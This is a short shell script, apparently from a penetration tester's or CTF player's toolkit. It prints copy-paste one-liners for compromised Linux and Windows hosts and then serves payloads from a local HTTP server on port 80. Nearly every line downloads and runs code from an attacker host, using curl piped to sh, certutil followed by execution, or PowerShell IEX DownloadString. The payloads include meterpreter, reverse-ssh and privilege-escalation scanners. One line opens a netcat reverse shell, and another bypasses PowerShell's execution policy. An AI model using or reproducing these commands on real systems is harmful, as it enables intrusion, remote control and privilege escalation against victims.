#/bin/sh

echo "##### UNIX #####"
echo "curl http://$lip/lin/linpeas.sh | sh"
echo "curl http://$lip/lin/sshput.sh | sh"
echo "curl http://$lip/lin/sshput.sh -o /var/tmp/1 ; chmod 777 /var/tmp/1; /var/tmp/1"
echo "curl http://$lip/lin/reverse_brute.sh | sh"   # make sure you have set up vars in this script
echo "cd /var/tmp/ && curl http://$lip/lin/pspy64 -o pspy64 && chmod +x pspy64 && ./pspy64 -i 10"
echo "curl http://$lip/lin/meterpreterx64_p53.exe -o /var/tmp/1 ; chmod 777 /var/tmp/1; /var/tmp/1"

echo "##### WINDOWS #####"
echo "certutil.exe -urlcache -split -f \"http://$lip/win/meterpreterx64_p53.exe\"; .\meterpreterx64_p53.exe"
echo "certutil.exe -urlcache -split -f \"http://$lip/win/reverse-sshx64.exe\"; .\\\reverse-sshx64.exe" #  ssh -p 31337 $ip
echo "certutil.exe -urlcache -split -f \"http://$lip/win/PrivescCheck.ps1\"; Get-Content .\PrivescCheck.ps1 | Out-String | IEX ; Invoke-PrivescCheck -Extended"
echo "certutil.exe -urlcache -split -f \"http://$lip/win/winPEASx64.exe\"; .\winPEASx64.exe"
echo "certutil.exe -urlcache -split -f \"http://$lip/win/Powerless.bat\"; .\Powerless.bat"
echo "certutil.exe -urlcache -split -f \"http://$lip/win/HostRecon.ps1\"; .\HostRecon.ps1"
echo "certutil.exe -urlcache -split -f \"http://$lip/win/nc64.exe\"; .\\\nc64.exe -e cmd $lip 53"
echo "echo IEX(New-Object Net.WebClient).DownloadString('http://$lip/win/jaws-enum.ps1') | powershell -noprofile -"
echo "echo IEX(New-Object Net.WebClient).DownloadString('http://$lip/win/WindowsEnum.ps1') | powershell -noprofile -"
echo "certutil.exe -urlcache -split -f \"http://$lip/win/accesschk64.exe\"; .\accesschk64.exe"
echo "net use Z: \\$lip\share /user:whatever\u p"

echo "##### GENERAL LINUX #####"
echo "wget http://$lip/lin/"

echo "##### GENERAL WINDWOS #####"
echo "certutil.exe -urlcache -split -f \"http://$lip/win/\""
echo "iwr http://$lip/win/  -OutFile C:\Windows\Tasks\\"
echo "Set-ExecutionPolicy Bypass -Scope process -Force ; \$ErrorActionPreference= 'silentlycontinue'"

python3 -m http.server --directory /root/fileserver/ 80
